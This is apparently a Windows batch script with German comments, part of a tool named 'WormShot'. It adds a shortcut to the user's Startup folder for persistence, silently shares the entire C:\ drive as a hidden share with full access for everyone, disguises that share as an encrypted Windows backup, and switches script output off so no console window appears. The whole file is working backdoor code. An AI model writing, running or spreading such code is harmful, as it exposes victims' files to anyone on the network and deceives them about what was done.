
@echo off

cd /d "%~dp0"

REM Autostart
copy "SYS\start.lnk" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" || echo ERROR ###: AutoStart-Eintrag nicht gespeichert >> "Error.txt"


REM Netzwerkerkennung ist sowieso schon aktiviert, sonst würde es diesen Befehl nicht ausführen 


REM Gebe User Ordner für Netzwerk frei -- UNSICHTBAR
net share WindowsRecovery$=C:\ /GRANT:Jeder,FULL /UNLIMITED /REMARK:"Windows Sicherung - Daten werden verschluesselt im Netzwerk gesichert." /CACHE:no
REM Setze WScript als Standard-Output, damit kein Konsolenfenster erscheint
cscript //h:wscript //s

REM WormShot ist bereits am RemotePC angelegt, sonst wuerde dieser Befehl nicht ausgeführt werden. 

exit